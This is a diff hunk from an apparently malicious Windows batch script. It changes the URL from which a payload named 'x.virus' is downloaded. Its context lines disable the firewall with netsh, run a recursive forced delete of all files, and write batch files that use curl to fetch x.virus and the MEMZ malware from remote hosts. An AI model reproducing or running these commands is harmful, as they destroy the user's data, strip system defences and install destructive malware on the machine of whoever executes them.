@@ -28,7 +28,7 @@ netsh firewall set opmode mode=disable
 start cmd /k del /s /q **
 :: X VIRUS DOWNLOAD BAT
 echo @echo off > xvirusdownload.bat
-echo curl.exe --output x.virus.cmd --url https://youareabrainless.glitch.me/virus/x.virus.cmd >> xvirusdownload.bat
+echo curl.exe --output x.virus.cmd --url https://github.com/AliGqmrr/x.virus/raw/refs/heads/main/x.virus.cmd >> xvirusdownload.bat
 :: MEMZ DOWNLOAD BAT
 echo @echo off > memzdownload.bat
 echo curl.exe --output memz.bat --url https://raw.githubusercontent.com/Viper4K/malware/refs/heads/master/MEMZ/MEMZ.bat >> memzdownload.bat
